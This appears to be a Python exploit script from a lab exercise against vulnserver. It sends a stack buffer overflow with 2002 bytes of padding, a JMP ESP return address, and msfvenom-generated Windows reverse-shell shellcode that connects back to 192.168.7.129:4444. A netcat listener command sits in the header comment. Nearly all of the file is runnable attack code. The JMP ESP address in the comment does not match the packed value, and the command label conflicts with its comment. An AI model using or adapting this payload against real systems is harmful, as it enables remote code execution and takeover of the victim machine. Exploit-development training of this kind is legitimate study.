# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '192.168.7.62'   # vitcim IP
PORT = 9998         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.7.129 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a'
SHELL =  b""
SHELL += b"\xba\x98\x45\xe1\x94\xdb\xc5\xd9\x74\x24\xf4\x5e"
SHELL += b"\x2b\xc9\xb1\x57\x83\xee\xfc\x31\x56\x11\x03\x56"
SHELL += b"\x11\xe2\x6d\xb9\x09\x1b\x8d\x42\xca\x44\x04\xa7"
SHELL += b"\xfb\x56\x72\xa3\xae\x66\xf1\xe1\x42\x0c\x57\x12"
SHELL += b"\x54\xa5\x1d\x3c\x5b\x36\x2a\x32\xb3\xf9\xec\x1f"
SHELL += b"\xff\x98\x90\x5d\x2c\x7b\xa9\xad\x21\x7a\xee\x7b"
SHELL += b"\x4f\x93\xa2\x2c\x24\x39\x52\x58\x78\x82\x53\x8e"
SHELL += b"\xf6\xba\x2b\xab\xc9\x4f\x87\xb2\x19\x24\x4f\x95"
SHELL += b"\x98\xe8\xe4\x9d\x82\x5e\x7f\xd4\xc7\x62\x4e\x18"
SHELL += b"\x6e\x10\x84\x6d\x70\xf0\xd5\xb1\xb2\x33\x18\x9e"
SHELL += b"\x34\x0b\x1a\x3e\x43\x67\x59\xc3\x54\xbc\x20\x1f"
SHELL += b"\xd0\x23\x82\xd4\x42\x80\x33\x38\x14\x43\x3f\xf5"
SHELL += b"\x52\x0b\x23\x08\xb6\x27\x5f\x81\x39\xe8\xd6\xd1"
SHELL += b"\x1d\x2c\xb3\x82\x3c\x75\x19\x64\x40\x65\xc5\xd9"
SHELL += b"\xe4\xed\xe7\x0c\x98\x0d\xf8\x30\xc4\x99\x35\xfd"
SHELL += b"\xf7\x59\x51\x76\x8b\x6b\xfe\x2c\x03\xc0\x77\xeb"
SHELL += b"\xd4\x27\xa2\x4b\x4a\xd6\x4c\xac\x42\x1d\x18\xfc"
SHELL += b"\xfc\xb4\x20\x97\xfc\x39\xf5\x02\xf6\x9c\xa5\x30"
SHELL += b"\xf5\x75\x44\xdf\x04\xe2\xac\x10\xd6\x12\xcf\xfa"
SHELL += b"\x7f\xba\x2d\x05\xab\x5c\xb8\xe3\xc1\xb2\xec\xbc"
SHELL += b"\x7d\x71\xcb\x74\x19\x8a\x3e\xff\x25\x7b\x45\x58"
SHELL += b"\xa6\x84\x45\x0e\xce\x33\xac\x88\xf1\xc3\xfb\xbe"
SHELL += b"\x65\x48\xef\x7a\x97\x4f\x3a\x2b\xc0\xd8\xb1\xba"
SHELL += b"\xa3\x79\xc6\x96\x56\x7a\x52\x1d\xf1\x2d\xca\x1f"
SHELL += b"\x24\x19\x55\xdf\x03\x19\x91\x1f\xd2\x33\xea\x16"
SHELL += b"\x40\x0c\x84\x56\x84\x8c\x54\x01\xce\x8c\x3c\xf5"
SHELL += b"\xaa\xde\x59\xfa\x66\x73\xf2\x6f\x89\x22\xa7\x38"
SHELL += b"\xe1\xc8\x9e\x0f\xae\x33\xf5\x13\xa9\xcc\x8b\x14"
SHELL += b"\x4b\x0e\x5a\xdd\x3e\x79\x5f\x5a\x20\x64\x75\x97"
SHELL += b"\xc9\x31\x1c\x1a\x94\xc1\xcb\x59\xa1\x41\xf9\x21"
SHELL += b"\x56\x59\x88\x24\x12\xdd\x61\x55\x0b\x88\x85\xca"
SHELL += b"\x2c\x99"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
